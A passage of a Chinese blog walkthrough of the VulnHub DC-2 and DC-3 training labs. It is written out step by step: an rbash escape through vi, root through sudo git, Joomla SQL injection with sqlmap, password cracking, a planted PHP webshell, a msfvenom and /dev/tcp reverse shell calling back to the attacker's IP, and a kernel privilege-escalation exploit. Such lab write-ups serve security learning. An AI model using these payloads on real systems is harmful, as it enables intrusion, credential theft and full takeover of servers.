<p>发现没有该命令，那就可能是没有权限执行这个命令了</p>
<h3 id="rbash"><a href="#rbash" class="headerlink" title="rbash"></a>rbash</h3><p>看到<code>rbash</code>，不认识，查一下</p>
<blockquote>
<p><code>rbash</code><br>它与一般shell的区别在于会限制一些行为，让一些命令无法执行</p>
</blockquote>
<p>看来是限制了我们的命令，但我们还是得知道我们目前还能用那些命令，之前使用过<code>ls</code>，所以<code>ls</code>可以使用</p>
<blockquote>
<p>输入<code>ls /home/tom/usr/bin</code>   </p>
<p>&#x2F;&#x2F;查看rbash设置的可执行的命令</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831232504736.png" alt="image-20220831232504736"></p>
<p>我们可以看到我们可以利用</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">less <span class="keyword">ls</span> scp <span class="keyword">vi</span></span><br></pre></td></tr></table></figure>

<p>关键是<code>vi</code>的命令</p>
<h3 id="vi绕过-gt-rbash逃逸"><a href="#vi绕过-gt-rbash逃逸" class="headerlink" title="*vi绕过-&gt;rbash逃逸"></a>*vi绕过-&gt;rbash逃逸</h3><p>可以进入<code>vi</code>中，执行<code>set</code>命令，把<code>shell</code>改为<code>/bin/sh</code></p>
<blockquote>
<p> 先输入<code>vi</code>，进入<code>vi</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831233127692.png" alt="image-20220831233127692"></p>
<p>然后</p>
<blockquote>
<p>直接输入，<strong>不用按i</strong><br><code>:set shell=/bin/sh</code>    &#x2F;&#x2F;给shell赋值<br>回车<br><code>:shell</code>                &#x2F;&#x2F;执行shell<br>回车，就退回主界面来了</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831233626801.png" alt="image-20220831233626801"></p>
<p>这样我们就完成了逃逸</p>
<p>之前因为我们受限于<code>rbash</code>，不能执行<code>cd</code>等命令</p>
<p><img src="/2022/08/29/vulnhub/image-20220831233814113.png" alt="image-20220831233814113"></p>
<p>现在执行试试</p>
<p><img src="/2022/08/29/vulnhub/image-20220831234028674.png" alt="image-20220831234028674"></p>
<p>就没有阻止了</p>
<p>我们再试试<code>cat</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220831234235801.png" alt="image-20220831234235801"></p>
<p>发现<code>cat</code>命令找不到，但是我们已经绕过了<code>rbash</code>，所以只能是其他原因，最有可能就是<code>cat</code>的环境没有设置到当前位置</p>
<blockquote>
<p>输入<code>echo $PATH</code><br>这是显示当前环境变量，可能cat并没有被设置到当前的环境变量所以无法执行</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831234423827.png" alt="image-20220831234423827"></p>
<h3 id="设置全局变量"><a href="#设置全局变量" class="headerlink" title="*设置全局变量"></a>*设置全局变量</h3><blockquote>
<p>于是我们来设置全局变量,终端输入<br><code>export PATH=PATH:/usr/local/sbin:/usr/local/bin:usr/sbin:/usr/bin:/bin:sbin</code></p>
</blockquote>
<p>这样我们执行<code>cat</code>就不会只在<code>/home/tom/usr/bin</code>里面寻找了，会在很多目录里寻找</p>
<blockquote>
<p>输入</p>
<p><code>cd tom</code><br><code>ls</code><br><code>cat flag3.txt</code><br>得到flag3</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220831235038373.png" alt="image-20220831235038373"></p>
<blockquote>
<p><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</code><br>意思是：</p>
<p>可怜的老汤姆总是在追杰瑞。也许他应该为他造成的所有压力负责。</p>
<p>但是看到了su，也就是需要切换用户</p>
</blockquote>
<hr>
<h2 id="Flag4-1"><a href="#Flag4-1" class="headerlink" title="Flag4"></a>Flag4</h2><p>根据<code>flag3</code>，我们可以知道需要用<code>su</code>命令切换用户到<code>jerry</code></p>
<blockquote>
<p>输入<code>su jerry</code>和其密码<code>adipiscing</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220901094337288.png" alt="image-20220901094337288"></p>
<p>然后切换到<code>jerry</code>目录，发现<code>flag4.txt</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220901094512382.png" alt="image-20220901094512382"></p>
<blockquote>
<p><code>Good to see that you&#39;ve made it this far - but you&#39;re not home yet.</code> </p>
<p><code>You still need to get the final flag (the only flag that really counts!!!).</code>  </p>
<p><code>No hints here - you&#39;re on your own now.  :-)</code></p>
<p><code>Go on - git outta here!!!!</code><br>意思是：<br>很高兴看到你走了这么远，但你还没回家。<br>你仍然需要得到最后的标志（唯一真正重要的标志！！！）。<br>这里没有提示-你现在只能靠自己了。：-）</p>
<p>去吧-滚出去！！！！</p>
<p>看到git，就是提示我们用git命令</p>
</blockquote>
<hr>
<h2 id="Flag5-1"><a href="#Flag5-1" class="headerlink" title="Flag5"></a>Flag5</h2><h3 id="git缓存区溢出漏洞"><a href="#git缓存区溢出漏洞" class="headerlink" title="*git缓存区溢出漏洞"></a>*git缓存区溢出漏洞</h3><blockquote>
<p>输入<code>sudo -l</code><br>&#x2F;&#x2F;列出目前用户可执行与无法执行的指令。</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220901112624228.png" alt="image-20220901112624228"></p>
<p><u>就可以发现root以<code>nopasswd</code>【不需要密码】运行<code>git</code>命令</u></p>
<p>原理是<code>git</code>存在缓存区溢出漏洞，</p>
<p>在使用</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">sudo git -<span class="selector-tag">p</span></span><br></pre></td></tr></table></figure>

<p>不需要输入<code>root</code>密码，即可以<code>root</code>身份执行这条命令</p>
<p>操作如下</p>
<blockquote>
<p><code>sudo git -p</code>    </p>
<p>&#x2F;&#x2F;-p是分页查看，这个原理就是终端的窗口大小不够显示，所以下方会出现冒号，等待输入命令</p>
</blockquote>
<p>下面可以看看区别</p>
<h4 id="注意窗口大小"><a href="#注意窗口大小" class="headerlink" title="*注意窗口大小"></a>*注意窗口大小</h4><h5 id="1-窗口足够大"><a href="#1-窗口足够大" class="headerlink" title="1.窗口足够大"></a>1.窗口足够大</h5><p><img src="/2022/08/29/vulnhub/image-20220901113721300.png" alt="image-20220901113721300"></p>
<p>可以看到显示完了，就又回到原处了【不行】</p>
<h5 id="2-窗口小一些"><a href="#2-窗口小一些" class="headerlink" title="2.窗口小一些"></a>2.窗口小一些</h5><p><img src="/2022/08/29/vulnhub/image-20220901113851826.png" alt="image-20220901113851826"></p>
<p>下方就显示出:，等待输入</p>
<blockquote>
<p>冒号<code>:</code>是自带有的，不是输入的<br><code>:!/bin/sh</code></p>
<p>&#x2F;&#x2F;感叹号!是shell转义字符，所以要避免sudo授权用户使用<code>vi，vim，ftp，lee，more，git</code><br><code>进入root</code></p>
<p><code>cd /root</code></p>
<p>当然也可以执行<code>:!passwd root</code><br>修改其密码<br>然后<code>su root</code>登录也可</p>
</blockquote>
<h3 id="法-1-执行命令，拿到root的shell"><a href="#法-1-执行命令，拿到root的shell" class="headerlink" title="法 1.执行命令，拿到root的shell"></a>法 1.执行命令，拿到root的shell</h3><p><code>$</code>变成<code>#</code>成功</p>
<p><img src="/2022/08/29/vulnhub/image-20220901114902493.png" alt="image-20220901114902493"></p>
<h3 id="法-2-修改密码，登录"><a href="#法-2-修改密码，登录" class="headerlink" title="法 2.修改密码，登录"></a>法 2.修改密码，登录</h3><p><img src="/2022/08/29/vulnhub/image-20220901114453769.png" alt="image-20220901114453769"></p>
<p><code>$</code>变成<code>#</code>，成功登录</p>
<p><img src="/2022/08/29/vulnhub/image-20220901114726423.png" alt="image-20220901114726423"></p>
<p>然后到<code>/root</code>目录下，找到最后的 <code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220901115306177.png" alt="image-20220901115306177"></p>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">__    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___|<span class="string"> </span>|<span class="string"> </span>|<span class="string">   __</span>|<span class="string"> </span>|<span class="string"> ___  _ __   ___  / \</span></span><br><span class="line"><span class="string">\ \/  \/ / _ \ </span>|<span class="string"> </span>|<span class="string">  / _` </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> (_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/\_/ </span></span><br><span class="line"><span class="string">  \/  \/ \___</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">  \__,_</span>|<span class="string">\___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___\/   </span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Congratulatons!!!</code></p>
<p><code>A special thanks to all those who sent me tweets</code><br><code>and provided me with feedback - it&#39;s all greatly</code><br><code>appreciated.</code></p>
<p><code>If you enjoyed this CTF, send me a tweet via @DCAU7.</code><br>意思是：</p>
<p>恭喜！！！</p>
<p>特别感谢所有给我发推文的人</p>
<p>并向我提供了反馈-非常棒<br>谢谢。</p>
<p>如果您喜欢这个CTF，请通过@DCAU7给我发一条推文</p>
</blockquote>
<p><strong>5个旗子找完，游戏结束</strong></p>
<hr>
<h1 id="三、DC-3-初级"><a href="#三、DC-3-初级" class="headerlink" title="三、DC-3[初级]"></a>三、DC-3[初级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h2><p>【前面的靶机<code>ip</code>寻找，按之前的步骤即可】</p>
<p>先用<code>nmap</code>扫一下我们的靶机<code>ip</code></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -p- <span class="number">192.168.133.139</span></span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220902123406584.png" alt="image-20220902123406584"></p>
<p>看到只有<code>80</code>端口，运行着一个<code>http</code>服务，中间件为<code>apache2.4.18</code></p>
<p>内容管理系统（<code>CMS</code>）是<code>joomla</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902123056590.png" alt="image-20220902123056590"></p>
<p>利用插件<code>wappalyzer</code>，也可以看到其<code>CMS</code>为<code>joomla</code></p>
<p>我们可以利用<code>kali</code>包当中自带的<code>joomscan</code>工具对其进行扫描</p>
<blockquote>
<p>漏洞扫描器（JoomScan）是一个开源项目，其主要目的是实现漏洞检测的自动化，以增强Joomla CMS开发的安全性。该工具基于Perl开发，能够轻松无缝地对各种Joomla项目进行漏洞扫描，其轻量化和模块化的架构能够保证扫描过程中不会留下过多的痕迹。它不仅能够检测已知漏洞，而且还能够检测到很多错误配置漏洞和管理权限漏洞等等。还能够以HTML或文本格式导出扫描报告。</p>
</blockquote>
<p>【没有的，可能需要更新包，然后直接下载即可】</p>
<p><img src="/2022/08/29/vulnhub/image-20220902185529785.png" alt="image-20220902185529785"></p>
<blockquote>
<p>输入<code>joomscan -u 192.168.133.139</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220902185954570.png" alt="image-20220902185954570"></p>
<p>扫描发现了，管理员的登录网址<code>http://192.168.133.139/administrator/</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902190312468.png" alt="image-20220902190312468"></p>
<p>但是不知道用户名和密码</p>
<hr>
<p>发现其<code>joomla</code>版本为<code>3.7.0</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220902194849302.png" alt="image-20220902194849302"></p>
<p>但我们并不知道该版本有哪些漏洞，所以需要用到 <code>kali</code>的<code>Exploit-DB</code>工具</p>
<p>可以在浏览器里的<code>Exploit-DB</code>网址进行查询【不过因为是国外网址有点卡】</p>
<p><img src="/2022/08/29/vulnhub/image-20220902195723987.png" alt="image-20220902195723987"></p>
<p>然后寻找下载payload</p>
<hr>
<p>也可以在终端输入命令查询【也是基于<code>Exploit-DB</code>的命令行搜索工具,可以帮助我们查找渗透模块】</p>
<blockquote>
<p>输入<code>searchsploit joomla 3.7.0</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903084826356.png" alt="image-20220903084826356"></p>
<p>可以看到<code>joomla 3.7.0</code>版本存在<code>sql注入</code>的漏洞</p>
<p> 然后查看<code>Path</code></p>
<blockquote>
<p>输入<code>searchsploit -p 42033</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903124805721.png" alt="image-20220903124805721"></p>
<p><code>Path</code>就是该漏洞利用方法的文本地址</p>
<blockquote>
<p>输入<code>cat /usr/share/exploitdb/exploits/php/webapps/42033.txt</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903125053542.png" alt="image-20220903125053542"></p>
<p>可以看到该漏洞的测试平台，时间，还有漏洞的<code>CVE</code>编号</p>
<p>关键在它给出的<code>sqlmap</code>注入的模板</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering]</code></p>
<p>&#x2F;&#x2F;把localhost改成靶机ip即可</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903125630036.png" alt="image-20220903125630036"></p>
<p>运行</p>
<p><img src="/2022/08/29/vulnhub/image-20220903125921853.png" alt="image-20220903125921853"></p>
<p>发现了靶机下的数据库，我们所需要的就是<code>joomladb</code></p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb --tables</code></p>
<p>&#x2F;&#x2F;在原有的payload后加上-D joomladb，选定数据库<br>&#x2F;&#x2F;再在后面加上–tables，输出该数据库的表</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903130545749.png" alt="image-20220903130545749"></p>
<p>然后可以看到<code>#__users</code>的表，里面很可能有线索</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</code></p>
<p>&#x2F;&#x2F;和上一步类似，但注意表名有#，所以需要用引号框起来，不然后面语句全被注释了<br>&#x2F;&#x2F;*注，sqlmap提示按默认推荐就好</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></p>
<p>看到<code>username</code>和<code>password</code>，查看列里内容</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</code><br>&#x2F;&#x2F;dump获取字段中的数据</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></p>
<p>得到用户名和密码</p>
<p>但是密码被加密了，那就只能用一些工具进行解密</p>
<p>先生成一个加密密码的文本文件</p>
<blockquote>
<p>输入<code>vi passwd.txt</code><br>然后把加密数据复制进去<br><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>然后我们就需要用一个解密工具<code>john</code></p>
<p><code>John</code>是一个破解系统密码的工具</p>
<p>使用很简单</p>
<blockquote>
<p>输入<code>john passwd.txt</code></p>
<p>&#x2F;&#x2F;后面接的是密码文本文件</p>
</blockquote>
<p>然后输入</p>
<blockquote>
<p><code>john --show passwd.txt</code><br>&#x2F;&#x2F;查看爆破成功的密码，发现爆破成功</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></p>
<p>得到密码<code>snoopy</code></p>
<p>然后登录后台网址</p>
<blockquote>
<p>用户名：<code>admin</code><br>密码：<code>snoopy</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></p>
<p>登录成功，然后摸索分析一下网站</p>
<p>然后在<code>Extensions</code>–&gt;<code>Template</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></p>
<p><img src="/2022/08/29/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></p>
<p>发现有个<code>new file</code>，可以新建文件，那么我们也可以新建一个我们的木马文件，拿取靶机的<code>shell</code></p>
<h2 id="后门生成，进入shell"><a href="#后门生成，进入shell" class="headerlink" title="后门生成，进入shell"></a>后门生成，进入shell</h2><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><strong>msfvenom</strong></p>
<h4 id="msf生成木马"><a href="#msf生成木马" class="headerlink" title="msf生成木马"></a>msf生成木马</h4><blockquote>
<p>输入<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=4444 -f raw &gt; shell.php</code><br>&#x2F;&#x2F;注意，LHOST是kali的ip</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<blockquote>
<p>输入<code>cat shell.php</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></p>
<p>得到靶机对应的木马</p>
<p>然后在网站新建一个<code>php</code>文件</p>
<p><img src="/2022/08/29/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></p>
<p>然后把木马内容导入进去</p>
<p><img src="/2022/08/29/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></p>
<p> 然后保存一下</p>
<p><img src="/2022/08/29/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/</code>下上传的，所以访问</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></p>
<p>看到<code>/*</code>，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用<code>msf</code>进行利用</p>
<blockquote>
<p>先输入<code>msfconsole</code>，进入msf</p>
</blockquote>
<blockquote>
<p>然后输入<br><code>use exploit/multi/handler</code></p>
<p><code>set payload php/meterpreter/reverse_tcp</code><br>进入我们利用msf制作的木马利用环境</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></p>
<blockquote>
<p>输入<code>show options</code><br>看看需要填写什么</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></p>
<p>看到LHOST监听的ip没有填写</p>
<blockquote>
<p>输入<code>set LHOST 192.168.133.140</code>  &#x2F;&#x2F;kali的ip</p>
</blockquote>
<blockquote>
<p>输入<code>run</code>，运行</p>
</blockquote>
<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></p>
<p>然后输入</p>
<blockquote>
<p>输入<code>shell</code></p>
<p>然后输入<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>&#x2F;&#x2F;进入交互式shell，当然不嫌看着麻烦，也可以直接执行后面命令</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></p>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><blockquote>
<p>输入<code>ls</code>,简单看看文件</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></p>
<blockquote>
<p>输入<code>uname -a</code><br>查看系统版本</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></p>
<p>看到<code>unbuntu</code>是<code>2016</code>年<code>4</code>月发布的，所以是<code>unbuntu16.04</code></p>
<p><code>linux</code>版本是<code>4.4.0-21</code>版</p>
<p>所以根据这个版本看看有没有可以利用的漏洞，来方便我们提权</p>
<blockquote>
<p>还是利用之前用过的<br><code>searchsploit unbuntu 16.04</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></p>
<p><strong>double-fdput()</strong> ,这是运行可执行文件，即可获取<code>root</code>权限</p>
<p>我们把它内容显示出来</p>
<blockquote>
<p>输入<code>searchsploit -p 39772</code>显示文本路径<br>   <code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code> 显示内容</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></p>
<p>在最后看到该漏洞利用的<code>exp</code>下载链接</p>
<p><img src="/2022/08/29/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></p>
<p>下载最后一个链接的压缩包</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>

<p>然后在我们的网站后台上传上去，和创建木马文件时候一样</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></p>
<p>结果报错了</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></p>
<p>看来这个网站上传处是不能上传压缩包文件的</p>
<p>所以我们只能用工具进行直接上传了，比如蚁剑或者菜刀等工具</p>
<p>我们和之前一样新建一个<code>php</code>文件写上我们的一句话木马</p>
<p><img src="/2022/08/29/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></p>
<p>用蚁剑连接</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.139</span><span class="regexp">/templates/</span>protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></p>
<p>然后把我们的压缩包放在目录下</p>
<p><img src="/2022/08/29/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></p>
<p>然后返回<code>msf</code></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></p>
<p>发现压缩包已经在里面了</p>
<p>然后解压缩</p>
<blockquote>
<p>输入<code>unzip 39772.zip</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></p>
<p>发现目录下多了个<code>39772</code>的目录</p>
<blockquote>
<p>输入<code>cd 39772</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></p>
<p>发现有两个压缩包，我们利用<code>exploit.tar</code></p>
<blockquote>
<p>输入<code>tar -xvf exploit.tar</code> &#x2F;&#x2F;解压缩</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></p>
<p>发现多了个<code>ebpf_mapfd_doubleput_exploit</code>目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></p>
<p>发现有个<code>compile.sh</code></p>
<p>运行</p>
<blockquote>
<p>输入<code>./compile.sh</code></p>
</blockquote>
<p>发现目录下有多了一个<code>doubleput</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></p>
<p>这就是提权文件，运行一下</p>
<blockquote>
<p>输入<code>./doupleput</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，看看提权成功没</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/29/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></p>
<p>提权成功</p>
<p>然后我们到<code>/root</code>目录下查看 <code>flag</code></p>
<p><img src="/2022/08/29/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></p>
<hr>
<blockquote>
<figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">\ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line"> \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">   \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations are in order.  :-)</code></p>
<p><code>I hope you&#39;ve enjoyed this challenge as I enjoyed making it.</code></p>
<p><code>If there are any ways that I can improve these little challenges,</code><br><code>please let me know.</code></p>
<p><code>As per usual, comments and complaints can be sent via Twitter to @DCAU7</code></p>
<p><code>Have a great day!!!!</code></p>
<p>意思是：</p>
<p>恭喜你，一切正常。：-）</p>
<p>我希望你和我一样喜欢这个挑战。</p>
<p>如果有任何方法可以改善这些小挑战，</p>
<p>请让我知道。</p>
<p>如往常一样，评论和投诉可以通过Twitter发送到@DCAU7</p>
<p>祝你有美好的一天！！！！</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h4><blockquote>
<p>反弹shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
<p>通俗点说，反弹shell就是一种反向链接，与正向的ssh等不同，它是在对方电脑执行命令连接到我方的攻击模式，并且这种攻击模式必须搭配远程执行命令漏洞来使用。</p>
<p>由于防火墙等限制，对方机器只能发送请求，不能接收请求</p>
<p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，建立一个服务端，让恶意程序主动连接，才是上策。</p>
</blockquote>
<p>和法一一样，我们需要写一个反弹<code>shell</code>的<code>php</code>文件</p>
<blockquote>
<p><code>&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;</code></p>
<p>&#x2F;&#x2F;注意这里的ip为kali的ip，8888为监听的端口</p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></p>
<blockquote>
<p>输入<code>nc -lnvp 8888</code>开始监听<br>然后访问<code>456.php</code><br><code>http://192.168.133.139/templates/protostar/456.php</code></p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></p>
<p>拿到<code>shell</code>，后面提权和法一</p>
<p>一样</p>
<h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><h4 id="weevely【提权没回显】"><a href="#weevely【提权没回显】" class="headerlink" title="weevely【提权没回显】"></a><strong>weevely</strong>【提权没回显】</h4><blockquote>
<p><code>Weevely</code>是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p>
</blockquote>
<p>生成<code>Shell</code></p>
<blockquote>
<p><code>weevely generate  &lt;文件名&gt;</code></p>
<p><code>weevely generate 123456 shell.php</code></p>
</blockquote>
<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发<code>shell</code></p>
<blockquote>
<p><code>weevely http://192.168.133.139/templates/protostar/789.php 123456</code></p>
<p><code>python -m http.server 9999</code>   </p>
</blockquote>
<p><img src="/2022/08/29/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></p>
